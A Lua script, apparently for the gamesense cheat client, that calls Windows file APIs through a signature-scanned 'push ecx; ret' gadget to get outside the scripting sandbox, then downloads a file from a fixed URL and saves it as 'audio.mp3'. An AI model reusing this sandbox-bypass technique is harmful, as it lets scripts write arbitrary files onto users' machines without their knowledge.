-- @silentlag

local ffi = require("ffi")
local http = require("gamesense/http")

local function log(r, g, b, msg)
    client.color_log(r, g, b, "[downloader] " .. tostring(msg))
end

log(150, 200, 255, "script loaded, starting...")

ffi.cdef [[
    typedef void* HANDLE;
    typedef unsigned long DWORD;
    typedef int BOOL;
    typedef const char* LPCSTR;
    typedef void* LPVOID;
    typedef const void* LPCVOID;
    typedef DWORD* LPDWORD;
]]

local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", -1)
local INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF
local FILE_ATTRIBUTE_DIRECTORY = 0x10
local GENERIC_WRITE = 0x40000000
local CREATE_ALWAYS = 2
local FILE_ATTRIBUTE_NORMAL = 0x80

local ok_sig, api_or_err =
    pcall(
    function()
        local proxy_addr = client.find_signature("client.dll", "\x51\xC3")
        if not proxy_addr then
            error("proxy signature not found")
        end

        local get_mod_pattern = client.find_signature("client.dll", "\xC6\x06\x00\xFF\x15\xCC\xCC\xCC\xCC\x50")
        local get_proc_pattern =
            client.find_signature("client.dll", "\x50\xFF\x15\xCC\xCC\xCC\xCC\x85\xC0\x0F\x84\xCC\xCC\xCC\xCC\x6A\x00")
        if not get_mod_pattern then
            error("get_mod pattern not found")
        end
        if not get_proc_pattern then
            error("get_proc pattern not found")
        end

        local get_mod_addr = ffi.cast("void***", ffi.cast("char*", get_mod_pattern) + 5)[0][0]
        local get_proc_addr = ffi.cast("void***", ffi.cast("char*", get_proc_pattern) + 3)[0][0]

        local get_mod_proxy = ffi.cast("uintptr_t (__thiscall*)(void*, const char*)", proxy_addr)
        local get_proc_proxy = ffi.cast("uintptr_t (__thiscall*)(void*, uintptr_t, const char*)", proxy_addr)

        local k32 = get_mod_proxy(get_mod_addr, "kernel32.dll")
        if not k32 or k32 == 0 then
            error("kernel32 handle null")
        end

        local function resolve(name)
            local a = get_proc_proxy(get_proc_addr, k32, name)
            if not a or a == 0 then
                error("GetProcAddress failed: " .. name)
            end
            return a
        end

        local CreateFileA_addr = resolve("CreateFileA")
        local WriteFile_addr = resolve("WriteFile")
        local CloseHandle_addr = resolve("CloseHandle")
        local CreateDirectoryA_addr = resolve("CreateDirectoryA")
        local GetFileAttributesA_addr = resolve("GetFileAttributesA")

        local CreateFileA_proxy =
            ffi.cast("HANDLE (__thiscall*)(uintptr_t, LPCSTR, DWORD, DWORD, void*, DWORD, DWORD, HANDLE)", proxy_addr)
        local WriteFile_proxy =
            ffi.cast("BOOL (__thiscall*)(uintptr_t, HANDLE, LPCVOID, DWORD, LPDWORD, void*)", proxy_addr)
        local CloseHandle_proxy = ffi.cast("BOOL (__thiscall*)(uintptr_t, HANDLE)", proxy_addr)
        local CreateDirectoryA_proxy = ffi.cast("BOOL (__thiscall*)(uintptr_t, LPCSTR, void*)", proxy_addr)
        local GetFileAttributesA_proxy = ffi.cast("DWORD (__thiscall*)(uintptr_t, LPCSTR)", proxy_addr)

        return {
            CreateFileA = function(path)
                return CreateFileA_proxy(
                    CreateFileA_addr,
                    path,
                    GENERIC_WRITE,
                    0,
                    nil,
                    CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL,
                    nil
                )
            end,
            WriteFile = function(h, buf, size)
                local w = ffi.new("DWORD[1]")
                local ok = WriteFile_proxy(WriteFile_addr, h, buf, size, w, nil)
                return ok ~= 0, tonumber(w[0])
            end,
            CloseHandle = function(h)
                return CloseHandle_proxy(CloseHandle_addr, h) ~= 0
            end,
            CreateDirectoryA = function(path)
                return CreateDirectoryA_proxy(CreateDirectoryA_addr, path, nil) ~= 0
            end,
            GetFileAttributesA = function(path)
                return tonumber(GetFileAttributesA_proxy(GetFileAttributesA_addr, path))
            end
        }
    end
)

if not ok_sig then
    log(255, 60, 60, "init failed: " .. tostring(api_or_err))
    return
end
log(100, 255, 100, "winapi resolved ok")

local api = api_or_err

local function normalize(p)
    return (p:gsub("/", "\\"))
end

local function path_exists(p)
    return api.GetFileAttributesA(normalize(p)) ~= INVALID_FILE_ATTRIBUTES
end
local function is_directory(p)
    local a = api.GetFileAttributesA(normalize(p))
    if a == INVALID_FILE_ATTRIBUTES then
        return false
    end
    return bit.band(a, FILE_ATTRIBUTE_DIRECTORY) ~= 0
end
local function file_exists(p)
    local a = api.GetFileAttributesA(normalize(p))
    if a == INVALID_FILE_ATTRIBUTES then
        return false
    end
    return bit.band(a, FILE_ATTRIBUTE_DIRECTORY) == 0
end

local function ensure_dir(path)
    path = normalize(path)
    local parts, cur = {}, ""
    for part in path:gmatch("[^\\]+") do
        parts[#parts + 1] = part
    end
    for i, part in ipairs(parts) do
        if i == 1 and part:match("^%a:$") then
            cur = part
        else
            cur = (cur == "" and part) or (cur .. "\\" .. part)
        end
        if not cur:match("^%a:$") then
            if not path_exists(cur) then
                local ok = api.CreateDirectoryA(cur)
                if not ok and not is_directory(cur) then
                    return false, "CreateDirectoryA failed: " .. cur
                end
            end
        end
    end
    return true
end

local function write_file(path, data)
    path = normalize(path)
    local parent = path:match("^(.*)\\[^\\]+$")
    if parent then
        local ok, err = ensure_dir(parent)
        if not ok then
            return false, err
        end
    end
    local h = api.CreateFileA(path)
    if h == nil or h == INVALID_HANDLE_VALUE then
        return false, "CreateFileA failed"
    end
    local size = #data
    local buf = ffi.new("char[?]", size + 1)
    ffi.copy(buf, data, size)
    local ok, written = api.WriteFile(h, buf, size)
    api.CloseHandle(h)
    if not ok or written ~= size then
        return false, string.format("WriteFile failed %s/%s", tostring(written), size)
    end
    return true
end

local URL = "http://silentlag.s-ul.eu/65n0gVex"
local FOLDER = "12345"
local FILENAME = "audio.mp3"
local FILE_PATH = FOLDER .. "\\" .. FILENAME

log(200, 200, 255, "target: " .. FILE_PATH)

if file_exists(FILE_PATH) then
    log(100, 255, 100, "already exists, nothing to do")
    return
end

log(200, 200, 255, "not found, starting download...")

http.get(
    URL,
    function(success, response)
        log(200, 200, 255, "http callback fired")
        if not success then
            log(255, 60, 60, "http failed (success=false)")
            return
        end
        if not response then
            log(255, 60, 60, "http: response is nil")
            return
        end
        log(
            200,
            200,
            255,
            "http status=" .. tostring(response.status) .. " body_len=" .. (response.body and #response.body or -1)
        )

        if response.status and response.status ~= 200 then
            log(255, 60, 60, "bad status: " .. tostring(response.status))
            if response.headers then
                for k, v in pairs(response.headers) do
                    log(180, 180, 180, "  hdr " .. tostring(k) .. ": " .. tostring(v))
                end
            end
            return
        end
        if not response.body or #response.body == 0 then
            log(255, 60, 60, "empty body")
            return
        end

        local ok, err = write_file(FILE_PATH, response.body)
        if ok then
            log(100, 255, 100, "downloaded -> " .. FILE_PATH .. " (" .. #response.body .. " bytes)")
        else
            log(255, 60, 60, "write error: " .. tostring(err))
        end
    end
)

log(200, 200, 255, "download request queued")
